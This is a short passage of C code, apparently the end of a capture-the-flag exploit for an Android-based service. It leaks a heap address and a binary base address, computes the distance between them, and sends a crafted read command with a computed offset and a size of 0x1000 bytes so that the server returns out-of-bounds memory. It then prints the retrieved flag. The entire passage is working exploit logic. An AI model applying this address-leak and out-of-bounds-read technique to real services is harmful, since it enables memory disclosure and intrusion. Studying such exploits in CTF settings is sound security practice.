    fHeapAddress = getPointer(1061,pClientKey, pServerKey);
    LOGI("Heap Address = %lx\n", fHeapAddress);
    uint64_t fBinaryBase = getPointer(933,pClientKey, pServerKey)-4736;
    uint64_t kbOffset = 0x90c0;

    LOGI("BaseAddress Address = %lx\n", fBinaryBase);
    uint64_t offsetAddress = fHeapAddress-(fBinaryBase+kbOffset);
    LOGI("Difference = %lx %lx\n",offsetAddress, offsetAddress/8);


    rd.cmd = 3;
    rd.offset = offsetAddress/8;
    rd.numBytes = 0x1000;
    LOGI("Asking for %ld %ld\n", rd.offset, rd.numBytes);
    writeAll((uint8_t *)&rd, sizeof(rd), pClientKey);
    LOGI("Wrote %ld bytes to server\n", sizeof(rd));
    numBytes = readAll(readMessage, pServerKey);
    LOGI("Read %d bytes for cmd 3 from %ld=%ld\n", numBytes, offsetAddress, rd.offset);
    LOGI("Retrieved flag %s\n",(char*)readMessage);
}


#endif
